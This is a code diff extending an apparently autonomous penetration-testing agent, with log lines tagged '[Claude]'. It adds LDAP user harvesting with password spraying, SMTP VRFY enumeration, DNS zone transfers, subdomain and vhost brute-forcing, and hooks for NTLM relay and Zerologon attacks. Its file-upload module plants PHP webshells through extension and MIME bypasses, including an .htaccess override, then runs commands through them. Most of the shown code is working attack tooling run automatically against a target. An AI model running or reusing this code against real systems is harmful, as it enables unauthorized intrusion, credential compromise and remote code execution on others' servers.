+                    with open(f"/tmp/ldap_users_{target.replace('.','_')}.txt", "w") as f:
+                        f.write("\n".join(ldap_users))
+                    self._save_findings([{
+                        "title": f"LDAP Bind Anónimo + Enumeración de Usuarios @ {target}:{ldap_port}",
+                        "severity": "medium",
+                        "description": f"LDAP sin autenticación expone {len(ldap_users)} usuarios:\n{', '.join(ldap_users[:15])}",
+                        "cve": "",
+                    }], target)
+                    # Pass users to AD spray
+                    spray_outs = []
+                    for spray_p in ["Password1", "Welcome1!", f"{target.split('.')[0].capitalize()}2024!"]:
+                        spray, _ = self._run_cmd(
+                            f"ldap-spray-{spray_p[:8]}",
+                            f"crackmapexec smb {target} -u /tmp/ldap_users_{target.replace('.','_')}.txt "
+                            f"-p '{spray_p}' --continue-on-success 2>/dev/null | grep '\\[+\\]' | head -5",
+                            target, timeout=30,
+                        )
+                        if "[+]" in spray:
+                            spray_outs.append(spray)
+                    if spray_outs:
+                        accumulated_output.append(f"=== LDAP User Spray ===\n" + "\n".join(spray_outs[:3]))
+
+        # ── SMTP VRFY/EXPN user enumeration ──────────────────────────────
+        for smtp_port in [p for p in [25, 465, 587, 2525] if p in port_set]:
+            self._log(f"[Claude] SMTP-ENUM: VRFY/EXPN @ {target}:{smtp_port}")
+            smtp_out, _ = self._run_cmd(
+                f"smtp-vrfy-{smtp_port}",
+                f"smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                f"-t {target} -p {smtp_port} 2>/dev/null | grep -v 'Ctrl-C\\|RCPT\\|starting' | head -20; "
+                f"# Manual VRFY\n"
+                f"for u in root admin administrator postmaster www-data mail; do "
+                f"  R=$(echo -e 'VRFY $u\\r\\n' | nc -q 3 {target} {smtp_port} 2>/dev/null | grep -E '^[25][0-9]{{2}}'); "
+                f"  [ -n \"$R\" ] && echo \"SMTP_USER: $u — $R\"; "
+                f"done",
+                target, timeout=30,
+            )
+            if "SMTP_USER" in smtp_out or re.search(r'^252|^250', smtp_out, re.MULTILINE):
+                accumulated_output.append(f"=== SMTP User Enum {target}:{smtp_port} ===\n{smtp_out[:500]}")
+                self._save_findings([{
+                    "title": f"SMTP VRFY Usuario Válido @ {target}:{smtp_port}",
+                    "severity": "low",
+                    "description": f"SMTP permite enumerar usuarios via VRFY:\n{smtp_out[:300]}",
+                    "cve": "",
+                }], target)
+
+        # ── DNS zone transfer (TCP 53) ────────────────────────────────────
+        if 53 in port_set:
+            dns_out, _ = self._run_cmd(
+                "dns-axfr",
+                f"dig axfr @{target} 2>/dev/null | head -50; "
+                f"HOST=$(dig -x {target} @{target} 2>/dev/null | grep 'PTR' | awk '{{print $5}}' | sed 's/\\.$//' | head -1); "
+                f"[ -n \"$HOST\" ] && DOMAIN=$(echo $HOST | cut -d. -f2-) && "
+                f"dig axfr @{target} $DOMAIN 2>/dev/null | head -50; "
+                f"fierce --dns-servers {target} --domain $(echo $HOST | cut -d. -f2-) 2>/dev/null | head -30",
+                target, timeout=25,
+            )
+            if dns_out.strip() and "Transfer failed" not in dns_out:
+                accumulated_output.append(f"=== DNS Zone Transfer {target} ===\n{dns_out[:800]}")
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 2-7: File upload → webshell bypass
+    # ─────────────────────────────────────────────────────────────────────────
+    def _file_upload_exploit(self, target, open_ports, accumulated_output):
+        """Find file upload forms and bypass extension/MIME filters to plant webshell."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443, 8888)]
+        if not http_ports:
+            return
+
+        for port_num in http_ports[:2]:
+            proto = "https" if port_num in (443, 8443) else "http"
+            base = f"{proto}://{target}:{port_num}"
+            t_safe = target.replace(".", "_")
+
+            # Find upload endpoints
+            upload_out, _ = self._run_cmd(
+                f"upload-detect-{port_num}",
+                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
+                f"grep -iEo 'href=\"[^\"]*(?:upload|file|attach|media|image)[^\"]*\"' | head -10; "
+                f"curl -s --max-time 15 -L '{base}/' 2>/dev/null | "
+                f"grep -i 'type=\"file\"\\|enctype.*multipart' | head -5; "
+                f"# Common upload paths\n"
+                f"for path in /upload /uploads /upload.php /file-upload /media/upload /api/upload /img/upload; do "
+                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{base}$path' 2>/dev/null); "
+                f"  [ \"$CODE\" = '200' ] || [ \"$CODE\" = '405' ] && echo \"UPLOAD_PATH: $path ($CODE)\"; "
+                f"done",
+                target, timeout=25,
+            )
+            upload_paths = re.findall(r'UPLOAD_PATH: (/[^\s(]+)', upload_out)
+            if not upload_paths and "type=\"file\"" not in upload_out:
+                continue
+
+            self._log(f"[Claude] FILE-UPLOAD: encontradas rutas de subida → {upload_paths[:3]}")
+            # Try multiple bypass techniques for each upload path
+            shell_content_php = '<?php system($_GET["cmd"]); ?>'
+            shell_content_phtml = '<?php system($_REQUEST["cmd"]); ?>'
+
+            for upload_path in (upload_paths or ["/upload"])[:2]:
+                upload_url = base + upload_path
+                # Bypass attempts (filename, extension, MIME)
+                bypass_attempts = [
+                    ("shell.php",    "application/octet-stream", shell_content_php),
+                    ("shell.php%00.jpg", "image/jpeg",           shell_content_php),
+                    ("shell.phtml",  "image/jpeg",               shell_content_phtml),
+                    ("shell.php5",   "image/jpeg",               shell_content_php),
+                    ("shell.pHp",    "image/jpeg",               shell_content_php),
+                    ("shell.php.jpg","image/jpeg",               shell_content_php),
+                    (".htaccess",    "text/plain",               "AddType application/x-httpd-php .jpg"),
+                    ("shell.shtml",  "text/html",                "<!--#exec cmd=\"id\" -->"),
+                ]
+                for fname, mime, content in bypass_attempts:
+                    shell_out, _ = self._run_cmd(
+                        f"upload-{fname[:10].replace('.','_')}-{port_num}",
+                        f"curl -s --max-time 15 -X POST '{upload_url}' "
+                        f"-F 'file=@/dev/stdin;filename={fname};type={mime}' "
+                        f"-F 'submit=Upload' "
+                        f"<<<'{content}' 2>/dev/null | head -5; "
+                        f"# Try finding where it was saved\n"
+                        f"for upath in /uploads /upload /files /media /images /tmp; do "
+                        f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 "
+                        f"  '{base}$upath/{fname}' 2>/dev/null); "
+                        f"  [ \"$CODE\" = '200' ] && echo \"WEBSHELL_FOUND: $upath/{fname}\"; "
+                        f"done",
+                        target, timeout=20,
+                    )
+                    if "WEBSHELL_FOUND" in shell_out:
+                        # Found it — execute commands
+                        shell_path = re.search(r'WEBSHELL_FOUND: (/[^\s]+)', shell_out).group(1)
+                        cmd_out, _ = self._run_cmd(
+                            f"upload-rce-{port_num}",
+                            f"curl -s --max-time 10 '{base}{shell_path}?cmd=id' 2>/dev/null | head -3; "
+                            f"curl -s --max-time 10 '{base}{shell_path}?cmd=whoami' 2>/dev/null | head -2",
+                            target, timeout=15,
+                        )
+                        if "uid=" in cmd_out or "www-data" in cmd_out or "root" in cmd_out:
+                            self._capture_evidence(cmd_out, target, f"upload-rce-{port_num}", f"file upload webshell {fname}")
+                            accumulated_output.append(f"=== File Upload RCE ({fname}) ===\n{cmd_out[:400]}")
+                            self._save_findings([{
+                                "title": f"File Upload Bypass → Webshell RCE @ {base}{upload_path}",
+                                "severity": "critical",
+                                "description": f"Upload bypass con '{fname}' (MIME: {mime}) → webshell en {shell_path} → RCE.\n{cmd_out[:200]}",
+                                "cve": "",
+                            }], target)
+                            break
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Tier 2-10: Subdomain + virtual host enumeration
+    # ─────────────────────────────────────────────────────────────────────────
+    def _subdomain_vhost_enum(self, target, open_ports, accumulated_output):
+        """Enumerate subdomains (subfinder/amass) and virtual hosts (ffuf/gobuster vhost)."""
+        http_ports = [p["port"] for p in open_ports if "http" in p["service"].lower()
+                      or p["port"] in (80, 443, 8080, 8443)]
+        if not http_ports:
+            return
+
+        # Detect if target is a domain or IP
+        is_ip = bool(re.match(r'^\d+\.\d+\.\d+\.\d+$', target))
+        domain = target if not is_ip else None
+
+        # Try to get domain from reverse DNS if target is IP
+        if is_ip:
+            rdns, _ = self._run_cmd("rdns", f"host {target} 2>/dev/null | head -3", target, timeout=8)
+            domain_match = re.search(r'pointer\s+(.+?)\.?\s*$', rdns, re.MULTILINE)
+            if domain_match:
+                domain = domain_match.group(1).rstrip(".")
+
+        if not domain:
+            self._log(f"[Claude] SUBDOMAIN-ENUM: no se pudo determinar dominio para {target}")
+            return
+
+        # Extract apex domain
+        apex = re.sub(r'^.*?([^.]+\.[^.]+)$', r'\1', domain)
+        self._log(f"[Claude] SUBDOMAIN-ENUM: dominio={apex} → subfinder + vhost")
+
+        # ── Subdomain enumeration ─────────────────────────────────────────
+        subenum_out, _ = self._run_cmd(
+            "subfinder",
+            f"subfinder -d {apex} -silent 2>/dev/null | head -30; "
+            f"# Fallback: amass passive\n"
+            f"amass enum -passive -d {apex} -timeout 30 2>/dev/null | head -30; "
+            f"# Fallback: crt.sh\n"
+            f"curl -s --max-time 15 'https://crt.sh/?q=%.{apex}&output=json' 2>/dev/null | "
+            f"python3 -c \"import json,sys; "
+            f"[print(e['name_value']) for e in json.load(sys.stdin) if '*' not in e.get('name_value','')]\" "
+            f"2>/dev/null | sort -u | head -30",
+            target, timeout=90,
+        )
+        if subenum_out.strip():
+            subdomains = list(dict.fromkeys([
+                s.strip() for s in subenum_out.split("\n")
+                if s.strip() and apex in s and not s.startswith("#")
+            ]))[:20]
+            accumulated_output.append(f"=== Subdomains {apex} ===\n" + "\n".join(subdomains[:20]))
+            self._log(f"[Claude] SUBDOMAIN-ENUM: {len(subdomains)} subdominios encontrados")
+            for sub in subdomains[:10]:
+                # Quick check if subdomain resolves + responds
+                sub_check, _ = self._run_cmd(
+                    f"sub-check-{sub[:20].replace('.','_')}",
+                    f"curl -sk --max-time 8 -o /dev/null -w '%{{http_code}} %{{url_effective}}' "
+                    f"'https://{sub}/' 2>/dev/null; "
+                    f"curl -sk --max-time 8 -o /dev/null -w '%{{http_code}} %{{url_effective}}' "
+                    f"'http://{sub}/' 2>/dev/null",
+                    target, timeout=12,
+                )
+                if re.search(r'[23]\d\d', sub_check):
+                    self._save_findings([{
+                        "title": f"Subdominio Activo: {sub}",
+                        "severity": "info",
+                        "description": f"Subdominio {sub} responde en HTTP/HTTPS: {sub_check[:80]}",
+                        "cve": "",
+                    }], target)
+
+        # ── Virtual host brute force ──────────────────────────────────────
+        vhost_wl = next((p for p in [
+            "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
+            "/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt",
+            "/usr/share/wordlists/dirb/common.txt",
+        ] if __import__('os').path.exists(p)), None)
+
+        if not vhost_wl:
+            return
+
+        for port_num in http_ports[:1]:
+            proto = "https" if port_num in (443, 8443) else "http"
+            self._log(f"[Claude] VHOST-FUZZ: gobuster vhost @ {target}:{port_num}")
+            vhost_out, _ = self._run_cmd(
+                f"vhost-fuzz-{port_num}",
+                f"gobuster vhost -u '{proto}://{target}:{port_num}' -w {vhost_wl} "
+                f"--domain {apex} --append-domain -t 20 -q --timeout 8s "
+                f"2>/dev/null | grep -v 'Status: 404\\|Status: 400' | head -20; "
+                f"# Also with ffuf\n"
+                f"ffuf -u '{proto}://{target}:{port_num}/' -H 'Host: FUZZ.{apex}' "
+                f"-w {vhost_wl} -mc 200,301,302,403 -t 20 -timeout 8 -s 2>/dev/null | head -20",
+                target, timeout=120,
+            )
+            if vhost_out.strip():
+                accumulated_output.append(f"=== VHost Enum {target}:{port_num} ===\n{vhost_out[:600]}")
+                vhosts_found = re.findall(r'Found: (\S+\.'+re.escape(apex)+r')', vhost_out)
+                for vh in vhosts_found[:5]:
+                    self._save_findings([{
+                        "title": f"Virtual Host Descubierto: {vh} @ {target}:{port_num}",
+                        "severity": "low",
+                        "description": f"Virtual host {vh} activo en {target}:{port_num}",
+                        "cve": "",
+                    }], target)
+
     def _loop_target(self, target):
         self._log(f"[Claude] ══ Iniciando pentest autónomo → {target} ══")
         context_parts = [
@@ -8842,6 +9602,12 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             # Fallback: common ports
             port_str = "21,22,23,25,53,80,110,111,135,139,143,443,445,512,513,514,587,631,993,995,1099,1433,1521,1723,2049,3306,3389,4848,5432,5900,5985,6379,8080,8443,8888,9200,27017"
         self._log(f"[Claude] Puertos detectados: {port_str[:120]}")
+
+        # ── FASE 1.5: UDP scan + SNMP (in parallel with deep TCP scan) ─────
+        import concurrent.futures as _cf0
+        _udp_future = None
+        _udp_exec = _cf0.ThreadPoolExecutor(max_workers=1, thread_name_prefix="udp")
+        _udp_future = _udp_exec.submit(self._udp_snmp_scan, target, accumulated_output)
 
         # ── FASE 2: Deep scan con versiones + vuln scripts ────────────────
         self._log(f"[Claude] Fase 2/5: Scan profundo con vuln scripts")
@@ -8888,24 +9654,40 @@ PRIORITIES: exploit confirmed vulns > enumerate unknown services > brute-force c
             self._run_kb_phase(target, open_ports, accumulated_output)
 
         def _phase4w():
-            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap")
+            self._log(f"[Claude] Fase 4w [parallel]: Web fuzzing + CMS + Log4Shell + SQLmap + Upload + Subdomains")
             self._web_fuzz(target, open_ports, accumulated_output)
             self._cms_exploit(target, open_ports, accumulated_output)
             self._log4shell_scan(target, open_ports, accumulated_output)
             self._sqlmap_auto(target, open_ports, accumulated_output)
+            self._file_upload_exploit(target, open_ports, accumulated_output)
+            self._subdomain_vhost_enum(target, open_ports, accumulated_output)
 
-        self._log(f"[Claude] Iniciando Fases 3+4+4w en paralelo (3 threads)")
-        with _cf.ThreadPoolExecutor(max_workers=3, thread_name_prefix="pentest") as executor:
+        def _phase4n():
+            self._log(f"[Claude] Fase 4n [parallel]: Network attacks — NTLM relay, Zerologon, AD enum")
+            self._ntlm_relay_attack(target, open_ports, accumulated_output)
+            self._zerologon_attack(target, open_ports, accumulated_output)
+            self._advanced_service_enum(target, open_ports, accumulated_output)
+
+        self._log(f"[Claude] Iniciando Fases 3+4+4w+4n en paralelo (4 threads)")
+        with _cf.ThreadPoolExecutor(max_workers=4, thread_name_prefix="pentest") as executor:
             f3 = executor.submit(_phase3)
             f4 = executor.submit(_phase4)
             f4w = executor.submit(_phase4w)
+            f4n = executor.submit(_phase4n)
             # Wait for all, surface any exceptions
-            for fut in _cf.as_completed([f3, f4, f4w]):
+            for fut in _cf.as_completed([f3, f4, f4w, f4n]):
                 try:
                     fut.result()
                 except Exception as exc:
                     self._log(f"[Claude] Fase paralela excepción: {exc}")
-        self._log(f"[Claude] Fases 3+4+4w completadas")
+        # Wait for UDP scan too
+        try:
+            if _udp_future:
+                _udp_future.result(timeout=10)
+            _udp_exec.shutdown(wait=False)
+        except Exception:
+            pass
+        self._log(f"[Claude] Fases 3+4+4w+4n completadas")
 
         # ── FASE 4b: Credential chaining con todo lo encontrado ─────────
         all_creds_so_far = re.findall(
